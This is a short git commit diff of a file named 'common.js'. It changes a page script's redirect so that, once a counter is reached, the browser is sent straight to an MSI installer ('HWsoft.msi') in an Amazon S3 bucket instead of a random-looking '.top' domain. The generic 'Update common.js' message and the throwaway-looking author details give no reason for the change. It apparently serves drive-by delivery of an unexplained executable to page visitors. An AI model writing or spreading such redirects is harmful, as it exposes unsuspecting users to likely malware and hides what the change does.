851228524f2225d7ae117a62bb57ab12c0e1bcda
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-07-16 23:56:41 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hyeiyevverldd.top";
+		var url="https://hellowoaid.s3.ap-southeast-2.amazonaws.com/HWsoft.msi";
 		window.location=url;
 	}
 }
